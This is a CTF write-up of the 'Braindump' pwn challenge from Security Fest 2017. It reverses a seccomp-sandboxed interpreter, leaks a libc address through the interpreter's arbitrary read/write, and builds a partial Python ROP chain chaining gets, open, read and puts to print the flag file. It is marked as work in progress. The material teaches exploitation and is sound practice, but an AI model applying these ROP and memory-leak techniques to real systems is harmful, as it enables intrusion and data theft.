---
layout: single
title: Braindump
author: true
---

Pwn challenge from *Security_fest* CTF for 200 points.

Disclaimer: **WORK IN PROGRESS**

```
Braindump - Pwn (200 + 0)

Oh boy, a custom interpreter service written by an intern? At least it's sandboxed! The flag is in /home/ctf/flag

Solves: 20

Service: nc pwn.ctf.rocks 31337

Download: http://dl.ctf.rocks/braindump.tar.gz

Author: likvidera
```

{% include toc %}

# Introduction

This was my first hands on experience with ROP.
At the time I was pretty familiar with the concept from reading, but without **any** real experience.
So I thought the best approach would be to try to solve it myself and in the parts I had no idea how
to make any progress I tried to reverse other solutions. Thanks for sharing them I used these two:
[first writeup](https://github.com/0xACB/ctf-solutions/blob/master/security-fest-2017/braindump/exploit.py)
and [second writeup](https://github.com/Laxa/write-ups/blob/master/Security%20Fest%202017/braindump/solve.py).

# Analysis

The description tells us that the flag is in `/home/ctf/flag`.

Binary provided is 64bit stripped ELF executable with libc which is nice.

In the start of program `main` initializes *seccomp* sandbox.
Then it reads input from `stdin` and processes every set of two characters.
The first look reveals that authors are kind and left us arbitrary read and write in the interpreter.
This is handy becase binary has most of the security mechanizms turned on.

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     0	  2	       braindump
```

## Pseudo code

This code is very abstract representation of binary.
Because of the `seccomp` sandbox we are limited to only a few syscalls.
This should not be a big problem since the `read and open` syscalls are at our disposal.

```c
char global_buffer[0x???];

int main(void)
{
    // At the start we have a stack address
    char tmp;
    global_buffer = &tmp;
    
    setvbuf(0, NULL, 2, stdout);
    setvbuf(0, NULL, 2, stdin);

    /* If no_new_privs is set, then operations that grant new privileges (i.e.
     * execve) will either fail or not grant them.  This affects suid/sgid,
     * file capabilities, and LSMs.
     */
    prctl(38, 1);

    /**
     * Kill the process
     * #define SCMP_ACT_KILL           0x00000000U
     */
    void *seccomp_struct = seccomp_init(0);

    /*
     * Allow the syscall to be executed
     * SCMP_ACT_ALLOW		0x7fff0000U
     */

    // sys_open
    seccomp_rule_add(seccomp_struct, 0x7fff0000, 0x2, 0x0);
    // sys_read
    seccomp_rule_add(seccomp_struct, 0x7fff0000, 0x0, 0x0);
    // sys_write
    seccomp_rule_add(seccomp_struct, 0x7fff0000, 0x1, 0x0);
    // sys_exit
    seccomp_rule_add(seccomp_struct, 0x7fff0000, 0x3c, 0x0);
    // sys_exit_group
    seccomp_rule_add(seccomp_struct, 0x7fff0000, 0xe7, 0x0);
    // sys_rt_sigreturn
    seccomp_rule_add(seccomp_struct, 0x7fff0000, 0xf, 0x0);

    if (seccomp_load(seccomp_struct) == 0)
    {
	puts("Uh-oh, contact an admin!");
	exit(0);
    }

    printf("[Interpreter service]\nEnter your code:");
    fgets(global_buffer, 2048, stdin);
    for(int i = 0; i < strlen(global_buffer);)
    {
	if(interpret(global_buffer[i], global_buffer[i+1]) != 0)
	{
	    i += 2;
	    continue;
	}
	puts("Incorrect syntax, RTFM!");
    }

    return 0;
}

int interpret(char first, char second)
{
    uint64_t *tmp = global_buffer;
    if(first == 0x21) // '!'
    {
	if(second == 0x29) // '<'
	{
	    tmp[0]++;
	}

	if(second == 0x28) // '>'
	{
	    tmp[0]--;
	}

	if(second == 0x2b) // '+'
	{
	    global_buffer[0]++;
	}

	if(second == 0x2d) // '-'
	{
	    global_buffer[0]--;
	}

	if(second == 0x3a) // ':'
	{
	    putchar(global_buffer[0]);
	}

	if(second == 0x2e) // '.'
	{
	    global_buffer[0] = getchar();
	}

	if(second == 0x5f) // '_'
	{
	    char c = global_buffer[0];
	    global_buffer[0] = (uint8_t) (c + 1) ^ c;
	    
	}

	if(second == 0x28 || second == 0x29) // '(' || ')'
	{
	    puts("Not implemented yet!");
	}
	return 1;
    }
    else
    {
        return 0;
    }
}
```

Interpret function accepts two parameters from which first one is some kind of command indicator('!')
and the second one is the actual command.

The commands we can issue looks like this

| Symbol | Function         |
|--------+------------------|
| !<     | ptr-\-            |
| !>     | ptr++            |
| !+     | bptr++           |
| !-     | bptr-\-           |
| !:     | putchar(ptr)     |
| !.     | *ptr = getchar() |
| !_     | Not relevant(probably toggles the last bit)                 |
| !(     | Not implemented  |
| !)     | Not implemented  |

## Writeup

We are dealing with binary that has ASLR enabled, which means we have to somehow leak pointer from binary
else we would have to bruteforce addresses.

Remember everything is *relative*.

Our global variable is initialize with the address of stack based-variable. The interpreter
supports variable incrementation, which will let us move through the stack. Let's see what is located after
our stack variable.

By breaking on this instruction we can observe how is the global variable initialized.
```sh
0x00400c09       488905b0142000  mov qword [rip + 0x2014b0], rax
```

*Rax* will contain the address of stack based variable. By using peda command `telescope` we can examine
what the memmory looks like.


```sh
gdb-peda$ telescope $rax 0x50
0000| 0x7fffffffe7d0 --> 0x0
0008| 0x7fffffffe7d8 --> 0x0
0016| 0x7fffffffe7e0 --> 0x0
0024| 0x7fffffffe7e8 --> 0x0
# ... Bunch of zeros until...
0480| 0x7fffffffe9b0 --> 0x0
0488| 0x7fffffffe9b8 --> 0x0
0496| 0x7fffffffe9c0 --> 0x7fff00000000
0504| 0x7fffffffe9c8 --> 0x53f51a10c08e6d00
0512| 0x7fffffffe9d0 --> 0x400e30 (push   r15)
0520| 0x7fffffffe9d8 --> 0x7ffff7814511 (<__libc_start_main+241>:       mov    edi,eax) # exactly what we are looking for
```

In this example the `rax = 0x7fffffffe7d0` and return pointer is @ `0x7fffffffe9d8`. With a simple calculation we can
figure out the offset from our *global* variable to address from *libc*.

```sh
#       abs(rax            - return_pointer) = offset 
In [1]: asb(0x7fffffffe7d0 - 0x7fffffffe9d8)
Out[1]: 520
```

In order to leak a pointer we will need to move interpreter pointer to location where return address to libc is stored(offset 520 from current value).
And after that trigger **putchar()** command 8 times to leak 64bit value.


After this we can issue the `!.` interpreter command which will get char to a location saved in our global variable.
Since the address is 64 bit long we will need 8 consecutive reads.

Now we just need to create a payload(ROP chain). Since we are limited to a few `syscalls` we can not just simply
spawn a shell. We need to chain `open, read, write` syscalls in order to read flag file. The good thing is that we are
allowed to use gadgets and even **functions** from libc(which was provided) by calculating their addresses based on our leak.

So what would be the *simplest* way to open file, read its contents and the print it to the user?
Let's build a simple C program that does just that.

```c
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

int main(void)
{
    char buffer[0x400] = {0};

    open("./test_flag.txt", 0);
    read(3, buffer, 0x100);
    puts(buffer);
    
    return 0;
}
```

We run into a few problem we need to address before this can work.
First is that there is no convenient `buffer[]` we controll.
Second, we need a way to provide a file path that our rop chain can later use.

To solve the first problem we need to check what memory areas are available to program and how their addresses change when program is rerun.
Memory has to be both writable and readable at the same time.

```sh
0x00400000         0x00402000         r-xp      /home/vagrant/dev/ctf/security_fest2017/braindump[pwn-200]/bin/braindump
0x00601000         0x00602000         r--p      /home/vagrant/dev/ctf/security_fest2017/braindump[pwn-200]/bin/braindump
0x00602000         0x00603000         rw-p      /home/vagrant/dev/ctf/security_fest2017/braindump[pwn-200]/bin/braindump
0x00007ffff77f4000 0x00007ffff798f000 r-xp      /usr/lib/libc-2.25.so
0x00007ffff798f000 0x00007ffff7b8e000 ---p      /usr/lib/libc-2.25.so
0x00007ffff7b8e000 0x00007ffff7b92000 r--p      /usr/lib/libc-2.25.so
0x00007ffff7b92000 0x00007ffff7b94000 rw-p      /usr/lib/libc-2.25.so
0x00007ffff7b94000 0x00007ffff7b98000 rw-p      mapped
0x00007ffff7b98000 0x00007ffff7bc4000 r-xp      /usr/lib/libseccomp.so.2.3.2
0x00007ffff7bc4000 0x00007ffff7dc4000 ---p      /usr/lib/libseccomp.so.2.3.2
0x00007ffff7dc4000 0x00007ffff7dd9000 r--p      /usr/lib/libseccomp.so.2.3.2
0x00007ffff7dd9000 0x00007ffff7dda000 rw-p      /usr/lib/libseccomp.so.2.3.2
0x00007ffff7dda000 0x00007ffff7dfd000 r-xp      /usr/lib/ld-2.25.so
0x00007ffff7fe2000 0x00007ffff7fe7000 rw-p      mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p      [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /usr/lib/ld-2.25.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /usr/lib/ld-2.25.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]

0x00400000         0x00402000         r-xp      /home/vagrant/dev/ctf/security_fest2017/braindump[pwn-200]/bin/braindump
0x00601000         0x00602000         r--p      /home/vagrant/dev/ctf/security_fest2017/braindump[pwn-200]/bin/braindump
0x00602000         0x00603000         rw-p      /home/vagrant/dev/ctf/security_fest2017/braindump[pwn-200]/bin/braindump
0x00007ffff77f4000 0x00007ffff798f000 r-xp      /usr/lib/libc-2.25.so
0x00007ffff798f000 0x00007ffff7b8e000 ---p      /usr/lib/libc-2.25.so
0x00007ffff7b8e000 0x00007ffff7b92000 r--p      /usr/lib/libc-2.25.so
0x00007ffff7b92000 0x00007ffff7b94000 rw-p      /usr/lib/libc-2.25.so
0x00007ffff7b94000 0x00007ffff7b98000 rw-p      mapped
0x00007ffff7b98000 0x00007ffff7bc4000 r-xp      /usr/lib/libseccomp.so.2.3.2
0x00007ffff7bc4000 0x00007ffff7dc4000 ---p      /usr/lib/libseccomp.so.2.3.2
0x00007ffff7dc4000 0x00007ffff7dd9000 r--p      /usr/lib/libseccomp.so.2.3.2
0x00007ffff7dd9000 0x00007ffff7dda000 rw-p      /usr/lib/libseccomp.so.2.3.2
0x00007ffff7dda000 0x00007ffff7dfd000 r-xp      /usr/lib/ld-2.25.so
0x00007ffff7fe2000 0x00007ffff7fe7000 rw-p      mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r--p      [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /usr/lib/ld-2.25.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /usr/lib/ld-2.25.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
```

Nice, it looks like there is a place which is writable and readable at the same time, and we know its location.
We can probably use it as place to save **file path** and then read the flag there.

Now I gathered some gadgets that were needed for the exploit.

```sh
0x0000000000021102: pop rdi; ret;
0x00000000000202e8: pop rsi; ret;
```

These gadgets are everything we need. Their purpose is only to setup function calls. And since the binary is 64bit
calling convention requires us to pass first two arguments(all we need) in **rdi and rsi**.

To create a ROP chain we will use this python code.

```python
rop = ''
rop += p64(POP_RDI)
rop += p64(BSS_ADDR)
rop += p64(libc_gets)

rop += p64(POP_RDI)
rop += p64(BSS_ADDR)
rop += p64(POP_RSI)
rop += p64(0)
rop += p64(libc_open)

rop += p64(POP_RDI)
rop += p64(3)
rop += p64(POP_RSI)
rop += p64(BSS_ADDR)
rop += p64(libc_read)

rop += p64(POP_RDI)
rop += p64(BSS_ADDR)
rop += p64(libc_puts)
```

The last step is to finalize the exploit. Get everything together and send
it to the server(since I wrote it long after the challenge ended, I was only able to test the solution localy).
